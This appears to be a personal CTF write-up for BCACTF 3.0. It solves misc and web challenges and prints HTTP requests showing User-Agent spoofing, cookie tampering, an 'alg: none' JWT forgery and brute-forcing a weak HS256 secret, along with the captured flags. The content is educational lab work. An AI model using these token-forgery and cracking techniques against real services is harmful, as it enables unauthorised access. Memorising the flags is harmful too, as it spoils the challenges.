+++
title = "bcactf 3.0"
date = "2022-06-04"
weight = 0
[taxonomies]
tags=["ctf", "web", "cookie", "misc"]
ctf=["bcactf"]
+++

##### Post source code: [Github - bcactf-3.0](https://github.com/BCACTF/bcactf-3.0)

# Misc
## Discord
bcactf{0bL1g4T0Ry_d15C0rD_ch4Ll_5jGsnoJn}

## Gogle Maze
> Make it to the end of my endless maze to get the flag!
Attachments : [Google Form](https://docs.google.com/forms/d/e/1FAIpQLScDtR-LxqgjFNHmrNWKX433gdEtN2WfeEqn9o8Y0avTbkxoBw/viewform)


![maz1.png](/imgs/ctf/bcactf3/maz1.png)

If you keep pressing next, you are met with an endless cycle.

So i decided to look at the source code
inspector:
![maz.png](/imgs/ctf/bcactf3/maz.png)

bcactf{f4rthER_th4n_m3eTS_th3_EY3_9928ef}


## Blender Creation
Found the python script at the end of the file, but decided to skip the challenge because i got python errors (Couldn't import the lib. My python install is scuffed)

Solution by: Almond Force
[BCACTF 3.0: Blender Creation](https://www.youtube.com/watch?v=DZMZ6jUZiJY)

## Keyboard

File: chall.txt:
"Cy ygpbo rgy ydco t.fxrape go.o yd. Ekrpat nafrgy! Cy p.annf m.oo.o gl mf mgojn. m.mrpfv Yd. unai co xjajyu?t3fx0ape{naf0g7{jdabi3gl{',.pyf+"


bcactf{KEYBOARD_LAYOUT_CHANGEUP_QWERTY}
^^ that what i got, doing it semi manually. I used the old trusty [dcode.fr](dcode.fr/en). But the flag was not correct, hence the link below

[Backseating myself](https://www.youtube.com/watch?v=5PC1CrBryFc):

I should've used a better converter. Decode.fr didnt allow for smooth non-alphanumeric alphabet, i only used uppercase.  

# Web
## Real Deal HTML
![realdeal](/imgs/ctf/bcactf3/realdeal.png)

## Agent Rocket

![agentlogin.png](/imgs/ctf/bcactf3/agentlogin.png)

```
User-Agent: BCACTF Rocket Control Panel
```

``` 
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 597
ETag: W/"255-20/tQXQ+SxtzVvDAjs4eZfVJjC4"
Date: Sat, 04 Jun 2022 15:12:25 GMT
Connection: close

<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="global.css" />
    <title>Agent Rocket</title>
  </head>
  <body>
    <div class="container">
      <h1>Welcome back Admin!</h2>
        <p>Here is your flag: bcactf{u53r_4g3Nt5_5rE_c0OL_1023}.<br>You should be able to launch the rocket with this.</p>
      <!-- The name of the device is "BCACTF Rocket Control Panel" in case you forgot. -->
    </div>
  </body>
</html>

```


## Three Step Trivia
Failed on "step 2/3". Didnt google enough, and i limited my bruteforce to 0-1000

[Solution by bhavya-error404 - Github](https://github.com/bhavya-error404/CTFs-Writeups/blob/main/BACTF/Web/Three%20Step%20Trivia.md)


# Cookies


![cookie.png](/imgs/ctf/bcactf3/cookie.png)
edit value to false, and admin

![insp](/imgs/ctf/bcactf3/insp.png)

```js
if (getCookie("pwd") == "98e99e97e99e116e102e123e117e36e101e114e115e95e115e51e51e95e99e48e48e107e33e101e115e95e55e111e111e95e56e54e51e111e52e116e53e125e") {
    window.location.replace("flag.html");
}
```

```
GET /flag.html HTTP/1.1
Host: web.bcactf.com:49200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: pwd=98e99e97e99e116e102e123e117e36e101e114e115e95e115e51e51e95e99e48e48e107e33e101e115e95e55e111e111e95e56e54e51e111e52e116e53e125e
Upgrade-Insecure-Requests: 1

```
![[cookie2.png]](/imgs/ctf/bcactf3/cookie2.png)

## Jason's Web Tarot
> I just found this amazing tarot card website! Legend has it that if you can subscribe to Jason's tarot service, he'll give you a free flag! Sadly, he closed down the subscription section of the site. Can you get me my flag?
> Hint: "How might the website keep track of if a user is subscribed?"

In firefox, open the dev-tools(ctrl+shift+i) in the "debugger"-tab
and navigave to:
http://web.bcactf.com:49201/card.html

Then in the debugger, script.js appears:
```js
$(document).ready(function () {
    function setRandTarot() {
        var images = [
            "la_justice.png",
            "le_diable.png",
            "le_monde.png",
            "le_pendu.png",
            "rayne_de_baton.png",
            "reyne_depee.png",
            "la_lune.png",
            "le_empereur.png",
            "le_soleil.png",
            "valet_depee.png",
            "cavalier_de_baton.png",
            "le_bateleur.png",
            "le_mat.png",
            "le_pape.png",
            "limpiratrice.png",
            "reyne_debaton.png"
        ];
        var i;
        i = parseInt(Math.random() * images.length);
        $("#tarot").fadeOut(function () {
            $("#tarot").attr("src", "img/" + images[i]);
            $("#tarot").fadeIn();
        });
    }
    function setDeathTarot() {
        $("#tarot").fadeOut(function () {
            $("#tarot").attr("src", "img/le_mort.png");
            $("#tarot").fadeIn();
        });
    }
    $("#refresh-card").click(function () {
        $("#message").text("");
        $.get("checktoken")
            .done(function (data, status) {
                if (data["message"] == "0") {
                    setRandTarot();
                }
                else if (data["message"] == "1") {
                    setDeathTarot();
                }
                else {
                    $("#tarot").fadeOut();
                    $("#message").text(data["message"]);
                    $("#message").fadeIn();
                }
            })
            .fail(function (data) {
                setRandTarot();
            })
    });
});
```
What's note worthy is the `else`-part of the if statement:
```js
    $("#refresh-card").click(function () {
        $("#message").text("");
        $.get("checktoken")
            .done(function (data, status) {
                if (data["message"] == "0") {
                    setRandTarot();
                }
                else if (data["message"] == "1") {
                    setDeathTarot();
                }
                else {
                    $("#tarot").fadeOut();
                    $("#message").text(data["message"]);
                    $("#message").fadeIn();
                }
            })
```

`$.get("checktoken")` looks like it checks our token when we load card.html
Therefore, we might be able to send a request to `/checktoken`.

By the looks of it, we want the respose to output `message` not a `1` or `0`


^ Else
intercept /checktoken in burp, and we can see that we are given a JWT

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1ODd9.FeOzxBet7HJ3ry34my5cDjMnTY2zoRVjPlWAyiAHLS0; Path=/
Content-Length: 13
ETag: W/"d-7GJcIGGUJGnOf9xJz6VzjWdnGEo"
Date: Sat, 04 Jun 2022 19:17:57 GMT
Connection: close

{"message":0}
```
We get message = 0, and we can sense some direction.

We notice that  according to the format of JWT's the token only consists of `header.payload.x` Where the `x` represents the signature. 
[For more info about jwt](https://jwt.io/introduction)

Base64 decode the header and payload
```bash
┌──(kali㉿kali)-[~/…/bcactf3/web/tarot2/c-jwt-cracker]
└─$ echo eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0 | base64 -d                                                   
{"alg":"none","typ":"JWT"}base64: invalid input
                                                                                                                                       
┌──(kali㉿kali)-[~/…/bcactf3/web/tarot2/c-jwt-cracker]
└─$ echo eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1NzR9 | base64 -d
{"isSubscriber":false,"iat":1654300574}
```
We need to change `isSubscriber` to `true`

We can just use [JWT.io](jwt.io) 

jwt uses "`base64UrlEncode`", so remember to strip `=` from the token, if you dont use jwt.io and `base64 -d` instead or burp suite.

Append the cookie as an header to a request (/checktoken)
```
GET /checktoken HTTP/1.1
Host: web.bcactf.com:49201
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc1N1YnNjcmliZXIiOnRydWUsImlhdCI6MTY1NDMwMDU3NH0.
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.bcactf.com:49201/card.html
If-None-Match: W/"d-R2eoxnyopImzswz1XDToC/GK5Ec"

```


```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Set-Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1NzR9.; Path=/
Content-Length: 47
ETag: W/"2f-U05BxFt3ynbML3NP5e9WUdyLJrA"
Date: Sat, 04 Jun 2022 16:51:43 GMT
Connection: close

{"message":"bcactf{n0_s3cr3t5????!!!?!_38893}"}
```


### tarot2 
> I think Jason realized his last attempt at making a tarot website wasn't super secure... so he tightened his security a bit. I still really want that flag though...
> Hint:"What did he change?"

```
GET /checktoken HTTP/1.1
Host: web.bcactf.com:49202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.bcactf.com:49202/card.html

```

token:
```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1ODd9.FeOzxBet7HJ3ry34my5cDjMnTY2zoRVjPlWAyiAHLS0; Path=/
Content-Length: 13
ETag: W/"d-7GJcIGGUJGnOf9xJz6VzjWdnGEo"
Date: Sat, 04 Jun 2022 19:17:57 GMT
Connection: close

{"message":0}
```

Now signed and has  `alg: hs256`

Background:
https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
Bruteforce:
https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/
Exploit:
[GitHub - JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)

```
┌──(kali㉿kali)-[~/…/bcactf3/web/tarot2/c-jwt-cracker]
└─$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1ODd9.FeOzxBet7HJ3ry34my5cDjMnTY2zoRVjPlWAyiAHLS0

Secret is "38r4"
```


I'm lazy so i just entered the secret into [JWT.io]

**image missing**

Request goes:
```
GET /checktoken HTTP/1.1
Host: web.bcactf.com:49202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOnRydWUsImlhdCI6MTY1NDMwMDU4N30.e2O2Ph8cRm-DEFGz3sbcIhvnGbJ_9jpfWQvcqNK4RdM
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.bcactf.com:49202/card.html

```

and response goes:

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1ODd9.FeOzxBet7HJ3ry34my5cDjMnTY2zoRVjPlWAyiAHLS0; Path=/
Content-Length: 46
ETag: W/"2e-jFXDDuXnOxuEclnJMK02hg8gaCc"
Date: Sat, 04 Jun 2022 19:13:52 GMT
Connection: close

{"message":"bcactf{hm@c_256_yeeeeah_24u9402}"}
```


### Wasm Prison
>To leave the prison, enter the flag.
	Hint 1 of 2:
What is call_indirect
	Hint 2 of 2:
Bruteforce can sometimes be an option

DNF

[Solution by awt-256](https://ctftime.org/writeup/34226)


